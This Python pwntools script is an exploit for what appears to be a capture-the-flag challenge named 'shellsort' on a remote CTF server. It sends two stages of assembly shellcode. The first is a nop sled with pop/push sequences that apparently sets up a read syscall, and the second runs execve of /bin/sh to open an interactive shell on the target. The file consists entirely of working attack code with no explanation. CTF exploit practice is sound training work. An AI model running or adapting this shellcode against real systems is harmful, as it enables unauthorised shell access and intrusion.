from pwn import *

context.arch = 'amd64'


r = remote('csie.ctf.tw', 10121)
#r = process('./shellsort-e496ba9bc348acb18b126ba077788b9a')

a = asm('''
        mov edx, 0xbabababa
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        nop
        nop
        nop
        nop
        nop
        nop
        nop
        pop rsi

        pop rsi
        pop rsi
        pop rsi
        pop rsi
        pop rsi
        pop rsi
        pop rsi
        pop rsi

        pop rsi
        pop rsi
        pop rbp
        pop rcx
        pop rcx
        pop rcx
        push rbp
        push rsp

        push rsp
        push rsp
        push rsp
        push rsp
        push rsp
        push rsp
        push rsp
        push rsp

        syscall
        '''
)

r.send(a)
time.sleep(2)

b = asm("""
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
	mov rax, 0x68732f6e69622f
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59
	syscall
    	"""
)

r.send(b)
r.interactive()
